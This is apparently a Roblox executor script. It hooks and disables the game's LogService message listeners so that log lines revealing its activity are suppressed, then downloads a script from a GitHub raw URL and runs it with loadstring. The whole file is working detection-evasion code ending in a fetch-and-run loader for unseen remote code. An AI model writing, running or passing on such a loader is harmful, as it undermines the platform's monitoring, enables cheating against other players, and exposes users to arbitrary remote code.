local tx = os.clock()
local Kye = select(2, pcall(getconnections, game:GetService("LogService").MessageOut))
if type(Kye) ~= "table" then
	Kye = {}
end
for _, c in ipairs(Kye) do
	pcall(
        function()
		local f = c.Function
		if type(f) ~= "function" then
			return c:Disable()
		end
		local key, msd = pcall(
                hookfunction, f, function(m, t)
			if type(m) == "string" and (m:lower():find("lur", 1, true) or m:find("internal", 1, true) or m:match(":%d+[:\n]")) then
				return
			end
			return msd and msd(m, t)
		end)
		if not key then
			c:Disable()
		end
	end)
end
print(string.format("[Bypass_L by_du8] Luar bypass %.2fs", os.clock() - tx)

wait(2)

loadstring(game:HttpGet("https://raw.githubusercontent.com/SyndromeXph/XK-Script/refs/heads/main/loader-4ce00b2f083bcdcb1781a42474a29c43.lua%20(1).txt"))()
